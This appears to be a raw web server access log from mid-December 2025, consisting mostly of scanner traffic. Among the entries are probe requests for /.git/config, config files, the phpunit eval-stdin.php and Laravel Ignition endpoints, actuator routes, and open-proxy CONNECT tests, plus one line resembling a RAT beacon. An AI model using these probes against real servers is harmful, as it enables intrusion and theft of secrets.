43.131.45.213 - - [16/Dec/2025:12:39:19 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.157.38.131 - - [16/Dec/2025:12:52:18 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
101.32.218.31 - - [16/Dec/2025:13:01:33 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
66.228.53.46 - - [16/Dec/2025:13:17:56 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.59.163.167 - - [16/Dec/2025:13:21:25 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1,nvdorz,nvd0rz"
45.33.14.197 - - [16/Dec/2025:13:33:36 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 zgrab/0.x"
179.43.184.242 - - [16/Dec/2025:13:33:37 +0700] "POST / HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
172.234.217.129 - - [16/Dec/2025:13:33:44 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
43.155.188.157 - - [16/Dec/2025:13:44:16 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.242.226.113 - - [16/Dec/2025:13:52:21 +0700] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xF3Qy\xAF\x8F\xB5\xC6\x8B\xE9\xB7\xCF\xF8Y\xB7\x03\x22\xEB\xEDT\x85:\x17\xE22lW\xA7\x93\x87V\xCB%\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
172.31.12.225 - - [16/Dec/2025:14:15:37 +0700] "GET /api/museum-info HTTP/1.1" 404 153 "-" "curl/8.12.1"
172.31.12.225 - - [16/Dec/2025:14:19:44 +0700] "HEAD / HTTP/1.1" 301 0 "-" "curl/8.12.1"
172.31.12.225 - - [16/Dec/2025:14:23:18 +0700] "HEAD / HTTP/1.1" 301 0 "-" "curl/8.12.1"
172.31.12.225 - - [16/Dec/2025:14:33:11 +0700] "HEAD / HTTP/1.1" 301 0 "-" "curl/8.12.1"
101.32.218.31 - - [16/Dec/2025:14:41:43 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
157.245.209.233 - - [16/Dec/2025:14:52:26 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1,nvdorz,nvd0rz"
91.224.92.55 - - [16/Dec/2025:15:38:38 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
139.135.59.147 - - [16/Dec/2025:15:53:12 +0700] "POST /HNAP1/ HTTP/1.0" 404 153 "-" "-"
156.232.94.80 - - [16/Dec/2025:15:59:45 +0700] "GET /version HTTP/1.1" 404 153 "-" "-"
156.232.94.80 - - [16/Dec/2025:15:59:45 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
156.232.94.80 - - [16/Dec/2025:15:59:53 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
156.232.94.80 - - [16/Dec/2025:15:59:53 +0700] "GET /v1 HTTP/1.1" 404 153 "-" "-"
156.232.94.80 - - [16/Dec/2025:15:59:53 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
156.232.94.80 - - [16/Dec/2025:16:00:26 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
156.232.94.80 - - [16/Dec/2025:16:00:26 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "http://13.214.39.19:80" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
101.32.218.31 - - [16/Dec/2025:16:21:48 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
20.65.194.27 - - [16/Dec/2025:16:22:05 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 zgrab/0.x"
179.43.184.242 - - [16/Dec/2025:16:42:32 +0700] "POST / HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
141.98.11.140 - - [16/Dec/2025:16:57:36 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
1.24.16.235 - - [16/Dec/2025:17:48:54 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
116.178.129.74 - - [16/Dec/2025:17:48:58 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
221.199.73.66 - - [16/Dec/2025:17:48:59 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
101.32.218.31 - - [16/Dec/2025:18:02:11 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
103.203.57.3 - - [16/Dec/2025:18:53:46 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 zgrab/0.x"
150.109.230.210 - - [16/Dec/2025:19:11:43 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
182.55.111.163 - - [16/Dec/2025:19:33:30 +0700] "GET / HTTP/1.0" 200 615 "-" "-"
45.156.129.135 - - [16/Dec/2025:19:34:14 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
3.95.243.114 - - [16/Dec/2025:19:55:50 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
49.51.243.156 - - [16/Dec/2025:20:15:37 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
74.50.65.135 - - [16/Dec/2025:20:43:19 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1,nvdorz,nvd0rz"
199.127.63.154 - - [16/Dec/2025:20:56:32 +0700] "GET /robots.txt HTTP/1.0" 404 153 "-" "xfa1"
45.135.194.23 - - [16/Dec/2025:21:09:43 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
93.174.93.12 - - [16/Dec/2025:21:15:24 +0700] "GET / HTTP/1.0" 200 615 "-" "Mozilla/5.0 (Linux; Android 8.0.0; LG-H873) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
101.32.218.31 - - [16/Dec/2025:21:23:23 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
96.126.104.20 - - [16/Dec/2025:21:49:42 +0700] "GET /IpLW HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
96.126.104.20 - - [16/Dec/2025:22:26:30 +0700] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03u\x07:QQ\xF4\xA4 \x1C\xA2\xD8\x97Hs\xC7+\x02\x0E\xE9P;\xE4Qn_r\x1A\x14\xD2\x9B\xB8* aeM/$+$" 400 157 "-" "-"
113.56.161.14 - - [16/Dec/2025:22:53:13 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15"
101.32.218.31 - - [16/Dec/2025:23:03:36 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
91.224.92.121 - - [16/Dec/2025:23:08:29 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
45.135.194.23 - - [16/Dec/2025:23:09:49 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
161.35.209.20 - - [16/Dec/2025:23:14:09 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
161.35.209.20 - - [16/Dec/2025:23:14:09 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "http://13.214.39.19/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
137.184.169.247 - - [16/Dec/2025:23:34:57 +0700] "\x00\x0E8\xF9\xDD{%\x95\xAE\xFF\xF0\x00\x00\x00\x00\x00" 400 157 "-" "-"
185.242.226.113 - - [16/Dec/2025:23:35:49 +0700] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xED\xCA\x11\xEC\x16\x02`\xD1\x98M9Y\xB5H$wd\xB1o\xF5\xCD`\x7F\xE9\xB5\xC5\xC9\xE7`\xC2\x22%\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
198.235.24.25 - - [16/Dec/2025:23:52:56 +0700] "GET / HTTP/1.1" 200 615 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
179.61.240.103 - - [17/Dec/2025:00:01:43 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (X11; Linux x86_64; WanscannerBot/1.2; +https://abuse.pend.re) Gecko/20100101 Firefox/10.0"
141.98.11.140 - - [17/Dec/2025:00:23:23 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
91.224.92.109 - - [17/Dec/2025:00:33:26 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
204.76.203.214 - - [17/Dec/2025:00:33:38 +0700] "GET /SDK/webLanguage HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [17/Dec/2025:00:43:37 +0700] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
101.32.218.31 - - [17/Dec/2025:00:44:04 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
205.210.31.5 - - [17/Dec/2025:01:44:45 +0700] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x9E\xB70\xD7\x90oh\x01`Qm\x87\xA6\x87O\x17" 400 157 "-" "-"
205.210.31.5 - - [17/Dec/2025:01:44:45 +0700] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x09\xCE\xEB\xB5\x99Ik\x7F\xED\xC7\xA3\xF8\x15\xAD\xE9\x01`\x9A\xA3\x87\x81-\xB3\xB2\xB3\x09h\xD5\xA8\xF9R~\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
198.235.24.31 - - [17/Dec/2025:01:45:02 +0700] "GET / HTTP/1.0" 200 615 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
101.32.218.31 - - [17/Dec/2025:02:24:21 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
185.247.137.220 - - [17/Dec/2025:02:46:12 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
188.166.254.122 - - [17/Dec/2025:02:46:48 +0700] "GET /.git/config HTTP/1.1" 404 153 "-" "python-requests/2.25.1"
198.235.24.9 - - [17/Dec/2025:02:56:28 +0700] "GET / HTTP/1.0" 200 615 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
34.79.159.68 - - [17/Dec/2025:03:08:49 +0700] "GET / HTTP/1.1" 200 615 "-" "python-requests/2.32.5"
45.135.194.23 - - [17/Dec/2025:03:20:09 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
79.124.40.174 - - [17/Dec/2025:03:32:53 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.156.129.134 - - [17/Dec/2025:03:34:09 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
91.232.238.112 - - [17/Dec/2025:03:44:41 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1"
79.124.40.174 - - [17/Dec/2025:03:58:48 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
101.32.218.31 - - [17/Dec/2025:04:04:40 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
79.124.40.174 - - [17/Dec/2025:04:15:39 +0700] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
159.223.35.25 - - [17/Dec/2025:04:16:50 +0700] "GET /.git/config HTTP/1.1" 404 153 "-" "python-requests/2.25.1"
79.124.40.174 - - [17/Dec/2025:04:20:54 +0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.202.118.22 - - [17/Dec/2025:04:35:58 +0700] "GET /developmentserver/metadatauploader HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
79.124.40.174 - - [17/Dec/2025:04:36:18 +0700] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
79.124.40.174 - - [17/Dec/2025:04:47:58 +0700] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
170.106.35.153 - - [17/Dec/2025:04:58:03 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
79.124.40.174 - - [17/Dec/2025:05:13:40 +0700] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
101.32.218.31 - - [17/Dec/2025:05:45:05 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
79.124.40.174 - - [17/Dec/2025:05:49:46 +0700] "GET /console/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
141.98.11.140 - - [17/Dec/2025:06:09:04 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
79.124.40.174 - - [17/Dec/2025:06:11:33 +0700] "GET /_ignition/execute-solution HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
79.124.40.174 - - [17/Dec/2025:06:21:16 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
102.22.20.125 - - [17/Dec/2025:06:33:15 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1,nvdorz,nvd0rz"
79.124.40.174 - - [17/Dec/2025:06:40:59 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.240.205.34 - - [17/Dec/2025:07:00:12 +0700] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 157 "-" "-"
91.232.238.106 - - [17/Dec/2025:07:10:35 +0700] "GET /robots.txt HTTP/1.0" 404 153 "-" "xfa1"
49.51.245.241 - - [17/Dec/2025:07:16:46 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.79.120.183 - - [17/Dec/2025:07:21:06 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; rv:139.0) Gecko/20100101 Firefox/139.0"
79.124.40.174 - - [17/Dec/2025:07:21:10 +0700] "GET /actuator/gateway/routes HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.120.183 - - [17/Dec/2025:07:21:15 +0700] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; rv:139.0) Gecko/20100101 Firefox/139.0"
79.124.40.174 - - [17/Dec/2025:07:36:44 +0700] "GET /geoserver HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.224.92.109 - - [17/Dec/2025:08:02:09 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
79.124.40.174 - - [17/Dec/2025:08:23:18 +0700] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x0B\xB5\xC0\x10\x10'|\x15Xn\x0B@\xA8wm\xFC\x9E\x1A\x9F\x22\xC5\x22g\x11#\xD7-\xF0\x8299= \xC0\xF5\xF6\xB8\x96T\x82\x8C\xCFY\x16TF,6" 400 157 "-" "-"
79.124.40.174 - - [17/Dec/2025:08:49:49 +0700] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.242.226.113 - - [17/Dec/2025:08:56:02 +0700] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xB4\x11\xC0s\xF8\xA5\x80\xA8\xCF^\x0B\xB5V^\x8C\x0E\x9CmUB\x03\xC4/\xDC\x97\xB1h\xD7x\x5C\xD8\x0B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
101.32.218.31 - - [17/Dec/2025:09:05:34 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
204.76.203.8 - - [17/Dec/2025:09:43:06 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
27.148.196.62 - - [17/Dec/2025:10:16:57 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0"
101.32.218.31 - - [17/Dec/2025:10:46:16 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
205.210.31.139 - - [17/Dec/2025:11:06:00 +0700] "GET / HTTP/1.1" 200 615 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
93.174.93.12 - - [17/Dec/2025:11:12:59 +0700] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
91.224.92.109 - - [17/Dec/2025:11:21:05 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
3.137.73.221 - - [17/Dec/2025:11:21:20 +0700] "GET / HTTP/1.1" 200 615 "-" "cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.137.73.221 - - [17/Dec/2025:11:21:58 +0700] "GET / HTTP/1.1" 200 615 "-" "cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.137.73.221 - - [17/Dec/2025:11:24:37 +0700] "" 400 0 "-" "-"
87.121.84.177 - - [17/Dec/2025:11:25:30 +0700] "GET http://api.caonimavip.xyz/ HTTP/1.1" 200 615 "-" "Go-http-client/1.1"
87.121.84.177 - - [17/Dec/2025:11:25:31 +0700] "CONNECT api.caonimavip.xyz:443 HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
87.121.84.177 - - [17/Dec/2025:11:25:31 +0700] "GET http://api.caonimavip.xyz/ HTTP/1.1" 200 615 "-" "Go-http-client/1.1"
87.121.84.177 - - [17/Dec/2025:11:25:31 +0700] "CONNECT api.caonimavip.xyz:443 HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
3.137.73.221 - - [17/Dec/2025:11:25:34 +0700] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x93\x8E\xE2\xF0\x09+c\x1D\x94\xEE\xD8\x90\xE0\x85f\xEAu\x0EE\xD1\xD6\xAE\x9C\xE9\x86!y\xB9fQ$\x96\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
3.137.73.221 - - [17/Dec/2025:11:25:38 +0700] "SSH-2.0-Go" 400 157 "-" "-"
3.137.73.221 - - [17/Dec/2025:11:27:20 +0700] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03*R\x98\xB9%\x0Bhd\xE1\xCFq\xAC\x96\xD4\xE32\xDD\xB2\xDB\x91\xB3AY\x19\xB7\xA034;z4\xD5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
141.98.11.74 - - [17/Dec/2025:11:41:16 +0700] "CONNECT google.com:443 HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
101.32.218.31 - - [17/Dec/2025:12:27:09 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
128.14.237.43 - - [17/Dec/2025:12:39:20 +0700] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xAF\x18\xD8h\x93\xFD" 400 157 "-" "-"
128.14.237.43 - - [17/Dec/2025:12:39:31 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
128.14.237.43 - - [17/Dec/2025:12:39:49 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
128.14.237.43 - - [17/Dec/2025:12:39:49 +0700] "GET /robots.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
128.14.237.43 - - [17/Dec/2025:12:39:49 +0700] "GET /sitemap.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
128.14.237.43 - - [17/Dec/2025:12:39:49 +0700] "GET /config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
45.135.194.23 - - [17/Dec/2025:12:46:31 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
